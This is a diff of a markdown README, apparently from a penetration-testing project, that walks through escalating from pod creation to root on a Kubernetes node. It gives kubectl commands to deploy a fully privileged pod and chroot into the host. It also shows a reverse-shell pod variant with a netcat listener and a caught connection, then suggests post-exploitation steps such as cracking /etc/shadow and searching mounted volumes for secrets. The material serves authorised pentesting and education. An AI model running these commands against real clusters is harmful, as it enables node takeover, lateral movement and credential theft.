@@ -1,37 +1,38 @@
 # You can create a pod with all the things
 If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 
 
+# Pod Creation
 
-## Pod you can exec into
+### Create a pod you can exec into
 [pod-everything-allowed.yaml](pod-everything-allowed.yaml)
 
-### Create a pod
+#### Create the pod
 ```bash
 # Option 1: Create pod from local yaml 
 kubectl apply -f pod-everything-allowed.yaml 
 # Option 2: Create pod from github hosted yaml
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/pod-everything-allowed.yaml 
 ```
-### Exec into pod 
+#### Exec into pod 
 ```bash
 kubectl exec -it pod-everything-allowed -- chroot /host
 ```
 
-## Reverse shell pod
+### Or, create a reverse shell pod
 [pod-everything-allowed-revshell.yaml](pod-everything-allowed-revshell.yaml)
 
-### Set up listener
+#### Set up listener
 ```bash
 nc -nvlp 3111
 ```
 
-### Create a pod
+#### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
 ```
 
-### Catch the shell and chroot to /host 
+#### Catch the shell and chroot to /host 
 ```bash
 ~ nc -nvlp 3116
 Listening on 0.0.0.0 3116
@@ -39,7 +40,7 @@ Connection received on 10.0.0.162 42035
 ~ chroot /host
 ```
 
-### Post exploitation
+# Post exploitation
 
 You now have root access to the node. Here are some next steps: 
 
@@ -97,11 +98,11 @@ Some other ideas:
 * Crack passwords in /etc/shadow, see if you can use them to access other nodes
 * Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 
 
-## Demonstrate Impact
+# Demonstrate Impact
 
 If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the pentration test. 
 
    
-## Reference(s)/Acknowledgements: 
+# Reference(s)/Acknowledgements: 
 * https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
   
